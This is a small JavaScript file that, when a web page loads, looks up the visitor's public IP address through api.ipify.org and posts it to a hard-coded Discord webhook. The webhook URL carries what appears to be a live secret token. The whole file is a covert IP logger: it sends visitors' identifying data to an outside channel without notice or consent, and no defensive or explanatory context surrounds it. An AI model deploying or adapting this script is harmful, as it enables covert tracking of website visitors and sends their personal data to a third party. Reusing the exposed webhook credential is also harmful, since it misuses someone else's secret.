function getVisitorIp() {
    return fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => data.ip)
        .catch(error => {
            console.error('Error fetching IP:', error);
            return null;
        });
}
function sendToDiscord(ip) {
    const webhookURL = "https://discord.com/api/webhooks/1288968762694963240/G_O4xUXDLHIcHd35TGezDOhAO9gaPPCxiZxPPOuQLyZ_JuULu3r4qYcNfBhrVUNeLSo9";

    const payload = {
        content: `New visitor IP address: ${ip}`,
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    })
    .then(response => {
        if (response.ok) {
            console.log('IP address sent to Discord successfully!');
        } else {
            console.error('Failed to send IP address to Discord:', response.statusText);
        }
    })
    .catch(error => {
        console.error('Error sending IP to Discord:', error);
    });
}
window.onload = async function() {
    const ip = await getVisitorIp();
    if (ip) {
        sendToDiscord(ip);
    }
};